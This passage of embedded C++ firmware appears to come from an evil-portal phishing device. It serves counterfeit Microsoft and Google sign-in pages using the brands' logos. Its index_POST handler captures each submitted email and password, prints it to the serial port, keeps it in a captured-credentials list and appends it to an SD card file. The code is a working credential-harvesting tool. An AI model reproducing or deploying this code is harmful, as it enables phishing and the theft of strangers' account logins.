.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z' fill='#737373'/><rect width='10.931' height='10.931' fill='#f25022'/><rect x='12.069' width='10.931' height='10.931' fill='#7fba00'/><rect y='12.069' width='10.931' height='10.931' fill='#00a4ef'/><rect x='12.069' y='12.069' width='10.931' height='10.931' fill='#ffb900'/></svg>"
                   "       </button>"
                   "       <button type='button' style='background: transparent' class='containerlogo' onclick='javascript:location.href=\"/google\"'>"
                   "         <svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='BFr46e xduoyf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg>"
                   "       </button>"
                   "     </div>"
                   "   </div>"
             "  </div>"
             "</body>"
             "</html>";
  return html;
}


String provider_GET(String provider) {
  
  provider.toLowerCase();
  if ((provider == "microsoft") || (provider == "msft")){
    provider = "Microsoft";
  }else{
    provider = "Google";
  }

  String loginTitle = String(LOGIN_TITLE);
  String loginSubTitle = String(LOGIN_SUBTITLE);
  String loginEmailPlaceholder = String(LOGIN_EMAIL_PLACEHOLDER);
  String loginPasswordPlaceholder = String(LOGIN_PASSWORD_PLACEHOLDER);
  String loginMessage = String(LOGIN_MESSAGE);
  String loginButton = String(LOGIN_BUTTON);

  loginTitle.replace(String("{provider}"), provider);
  loginSubTitle.replace(String("{provider}"), provider);
  loginEmailPlaceholder.replace(String("{provider}"), provider);
  loginPasswordPlaceholder.replace(String("{provider}"), provider);
  loginMessage.replace(String("{provider}"), provider);
  loginButton.replace(String("{provider}"), provider);

  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input type='hidden' name='provider' value='" + provider + "' /><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>", provider);
}

String index_POST() {
  String email = getInputValue("email");
  String password = getInputValue("password");
  String provider = getInputValue("provider");
  provider.toLowerCase();

  capturedCredentialsHtml = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;
  Serial.printf("Credential: %s\n", String(email + ":" + password).c_str());

  if ((provider == "microsoft") || (provider == "msft")){
    provider = "msft";
    cp1 = cp1 + 1;
  }else{
    cp2 = cp2 + 1;
  }
  totalCapturedCredentials = cp1 + cp2;

  for(int i=3;i>=1;i--){
    if (last_auth_idx[i-1] > 0){
      last_auth_prov[i] = last_auth_prov[i-1];
      last_auth_idx[i] = last_auth_idx[i-1];
      last_auth_username[i] = last_auth_username[i-1];
      last_auth_pass[i] = last_auth_pass[i-1];
    }
  }

  last_auth_prov[0] = provider;
  last_auth_idx[0] = totalCapturedCredentials;
  last_auth_username[0] = email;
  last_auth_pass[0] = password;

#if defined(HAS_SDCARD)
  appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
#endif

  if ((provider == "microsoft") || (provider == "msft")){
    provider = "Microsoft";
  }else{
    provider = "Google";
  }

  lastActivity = millis() + 1000;
  String msg = String(LOGIN_AFTER_MESSAGE);
  msg.replace("{provider}", provider);
  return getHtmlContents("<center><div class='containermsg'>" + msg + "</div></center>", provider);
}

String clear_GET() {
  String email = "<p></p>";
  String password = "<p></p>";
  capturedCredentialsHtml = "<p></p>";
  totalCapturedCredentials = cp1 = cp2 = 0;

  for(int i=0;i<4;i++){
    last_auth_prov[i] = "";
    last_auth_idx[i] = 0;
    last_auth_pass[i] = "";
    last_auth_pass[i] = "";
  }

  return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>", "");
}

#if defined(HAS_LED)

void blinkLed() {
  int count = 0;

  while (count < 5) {
    digitalWrite(GPIO_LED, LOW);
    delay(500);
    digitalWrite(GPIO_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}

#endif

#if defined(HAS_SDCARD)

void appendToFile(fs::FS& fs, const char* path, const char* text) {
  if (xSemaphoreTake(sdcardSemaphore, portMAX_DELAY) == pdTRUE) {
    File file = fs.open(path, FILE_APPEND);

    if (!file) {
      Serial.println("Failed to open file for appending");
      xSemaphoreGive(sdcardSemaphore);
      return;
    }

    Serial.printf("Appending text '%s' to file: %s\n", text, path);

    if (file.println(text)) {
      Serial.println("Text appended");
    } else {
      Serial.println("Append failed");
    }

    file.close();

    xSemaphoreGive(sdcardSemaphore);
  }
}

#endif
